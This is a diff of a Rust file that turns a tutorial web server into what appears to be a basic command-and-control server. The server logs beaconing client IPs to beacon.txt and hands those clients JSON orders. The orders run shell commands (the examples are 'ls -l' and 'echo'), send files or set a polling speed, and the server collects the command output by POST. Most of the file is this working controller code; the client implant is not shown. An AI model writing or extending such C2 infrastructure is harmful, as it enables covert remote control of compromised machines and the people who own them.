@@ -1,107 +1,184 @@
-/*use reqwest::Url;
-use http::Uri;
-use std::borrow::Cow;*/
 use std::{
-    fs,
+    fs::{OpenOptions, File},
     io::{prelude::*, BufReader},
-    net::{TcpListener, TcpStream, SocketAddr}
+    net::{SocketAddr},
 };
-  
-// https://doc.rust-lang.org/book/ch20-01-single-threaded.html
-// telnet 127.0.0.1 8080
+use chrono::prelude::*;
+use tiny_http::{Response};
+use serde::{Serialize, Deserialize};  
 
-fn handle_connection(mut stream: TcpStream) {
-    println!("Incoming connection from: {:?} \n", stream.peer_addr());
-    
-    let buf_reader = BufReader::new(&mut stream);
-    let http_request: Vec<_> = buf_reader
-        .lines()
-        .map(|result| result.unwrap())
-        .take_while(|line| !line.is_empty())
-        .collect();
-        
-    println!("Request: {:#?} \n", http_request);
-    
-    let status_line = "HTTP/1.1 200 OK\r\n\r\n";
-    let contents = fs::read_to_string("hello.html").unwrap();
-    let length = contents.len();
-    
-    let response = format!("{status_line}Content-Length: {length}\n{contents}");
-    println!("{}", response);
-    
-    stream.write_all(response.as_bytes()).unwrap();
+
+#[derive(Serialize, Deserialize, Debug, Clone)]
+enum OrdreType {
+    Commande,
+    Fichier,
+    Vitesse,
+    Autre
 }
 
-/*fn handle_connection(mut stream: TcpStream) {
-    let buf_reader = BufReader::new(&mut stream);
-    let request_line = buf_reader.lines().next().unwrap().unwrap();
+#[derive(Serialize, Deserialize, Debug)]
+struct Ordre {
+    ordre: OrdreType,
+    arguments: Vec<String>,
+}
 
-    let (status_line, filename) = if request_line == "GET / HTTP/1.1" {
-        ("HTTP/1.1 200 OK", "hello.html")
-    } else {
-        ("HTTP/1.1 404 NOT FOUND", "404.html")
+fn write_incoming_ip(request : Option<&SocketAddr>){
+    let fp = "./beacon.txt";
+    let does_exist = std::path::Path::new(fp).exists();
+    if !does_exist {
+        File::create(fp).unwrap();
+    }  
+    let mut ip = String::from("Unknown IP");
+    match request{
+        Some(res) => {
+            ip = String::from(res.to_string());
+            let temp_ip = String::from(res.to_string());
+            let split = temp_ip.split(":");
+            let mut compteur = true;
+            for l in split{
+                if compteur{
+                    ip = String::from(l);
+                    compteur = false;
+                }
+            }
+            println!("{}", ip);
+        },
+        None => ()
+    }
+    let file = File::open(fp).unwrap();
+    let reader = BufReader::new(file);
+    let mut does_exist = false;
+    for line in reader.lines() {
+        match line {
+            Ok(l) => {
+                if l.contains(&ip) {
+                    does_exist = true;
+                }
+            },
+            Err(_) => {
+                println!("error reading lines in file");
+            }
+        }
+    }
+    if !does_exist{
+        let mut file_ref = OpenOptions::new().append(true).open(fp).expect("Unable to open file"); 
+        file_ref.write_all(ip.as_bytes()).expect("write failed");
+        file_ref.write_all(" - active \n".as_bytes()).expect("write failed");
+    }
+}
+
+fn write_logs(request : Option<&SocketAddr>){
+    let fp = "./logs.txt";
+    let does_exist = std::path::Path::new(fp).exists();
+    if !does_exist {
+        File::create(fp).unwrap();
+    }
+    let mut file_ref = OpenOptions::new().append(true).open(fp).expect("Unable to open file");   
+    file_ref.write_all("Incoming connection from: ".as_bytes()).expect("write failed");
+    let mut ip = String::from("Unknown IP");
+    match request{
+        Some(res) => {
+            ip = String::from(res.to_string());
+        },
+        None => ()
+    }
+    file_ref.write_all(ip.as_bytes()).expect("write failed");
+    file_ref.write_all(" at : ".as_bytes()).expect("write failed");
+    let date_as_string = Utc::now().to_string();
+    file_ref.write_all(date_as_string.as_bytes()).expect("write failed");
+    file_ref.write_all("\n".as_bytes()).expect("write failed");
+    println!("Log appended successfully"); 
+}
+
+async fn handle_post_request(server: & tiny_http::Server) -> () {
+
+    let request = server.recv();
+
+    match request {
+        Ok(mut rq) => {
+
+            if *rq.method() == tiny_http::Method::Post {
+
+                let mut content = String::new();
+                rq.as_reader().read_to_string(&mut content).unwrap();
+
+                println!("{}", content);
+            
+                let response = Response::from_string("Recu requete POST\n");
+                rq.respond(response).unwrap();
+            }
+        },
+        Err(e) => { println!("error: {}", e);  }
+    };
+}
+
+async fn handle_file_post_request(server: & tiny_http::Server, filename: &str) -> () {
+
+    let request = server.recv();
+
+    match request {
+        Ok(rq) => {
+
+            if *rq.method() == tiny_http::Method::Post {
+                
+                let file = std::fs::File::open(filename).unwrap();
+
+                let mut response = Response::from_file(file);
+                let header = tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"multipart/form-data"[..]).unwrap();
+                response.add_header(header);
+                rq.respond(response).unwrap();
+            }
+        },
+        Err(e) => { println!("error: {}", e);  }
+    };
+}
+
+
+async fn send_ordre(server: & tiny_http::Server, ordre: OrdreType, arguments: Vec<String>) -> () {
+    let request = server.recv();
+    match request {
+        Ok(rq) => {
+
+            if *rq.method() == tiny_http::Method::Get {
+
+                println!("Incoming connection from: {:?} \n", rq.remote_addr());
+                write_incoming_ip(rq.remote_addr());
+                write_logs(rq.remote_addr());
+
+                let bod = Ordre { ordre: ordre.clone(), arguments: arguments.clone() };
+
+                let response = Response::from_string(serde_json::to_string(&bod).unwrap());
+                rq.respond(response).unwrap();
+
+                match ordre {
+                    OrdreType::Commande => {
+                        handle_post_request(&server).await;
+                    },
+                    OrdreType::Fichier => {
+                        let filename = arguments[0].as_str();
+                        handle_file_post_request(&server, filename).await;
+                    },
+                    _ => ()
+                }
+
+            }
+
+        },
+        Err(e) => { println!("error: {}", e);  }
     };
 
-    let contents = fs::read_to_string(filename).unwrap();
-    let length = contents.len();
-
-    let response =
-        format!("{status_line}\r\nContent-Length: {length}\r\n\r\n{contents}");
-
-    stream.write_all(response.as_bytes()).unwrap();
-}*/
-
-fn open_connection() {
-    let addrs = [
-        SocketAddr::from(([127, 0, 0, 1], 8080)),
-        SocketAddr::from(([127, 0, 0, 1], 8081)),
-    ];
-
-    if let Ok(stream) = TcpStream::connect(&addrs[..]) {
-        println!("Connected to the server!");
-    } else {
-        println!("Couldn't connect to server...");
-    }
 }
 
-/*fn get_params_by_url(req: String) -> Vec<(String, String)> {
-    let uri = req.parse::<Uri>().unwrap();
-
-    let tmp = Url::parse(&uri.to_string()).unwrap();
-    let params = tmp.query_pairs();
-
-    let vec_params = params.collect::<Vec<(Cow<'_, str>, Cow<'_, str>)>>();
-
-    let mut res = vec![];
-    for vp in vec_params {
-        res.push((String::from(vp.0), String::from(vp.1)));
-    }
-
-    return res;
-}*/
 
 #[tokio::main]
 async fn main() {
-    let listener = TcpListener::bind("127.0.0.1:8080").unwrap();
-    //println!("listening started, ready to accept");
+    let server = tiny_http::Server::http("0.0.0.0:8082").unwrap();
+    //////////////////////// Envoie une commande ls pour l'example
+    send_ordre(&server, OrdreType::Commande, vec![String::from("ls"), String::from("-l")]).await;
+    //////////////////////// envoie un echo pour l'exemple
+    send_ordre(&server, OrdreType::Commande, vec![String::from("echo"), String::from("titouan")]).await;
+    //////////////////////// envoie un fichier pour l'exemple
+    send_ordre(&server, OrdreType::Fichier, vec![String::from("texte.txt")]).await;
 
-    for stream in listener.incoming() {
-        let stream = stream.unwrap();
-
-        handle_connection(stream);
-    }
-
-    /*let params = [("foo", "kjj"), ("baz", "quux")];
-    let resp = Client::new()
-        .post("http://127.0.0.1:5500/test.html?foo=1&bar=2")
-        .form(&params)
-        .body("the exact body that is sent")
-        .send()
-        .await;
-
-    let request = String::from("http://127.0.0.1:5500/test.html?foo=value1&bar=value2");
-
-    let resp = get_params_by_url(request);
-
-    dbg!(resp);*/
+    send_ordre(&server, OrdreType::Vitesse, vec![String::from("1")]).await;
 }
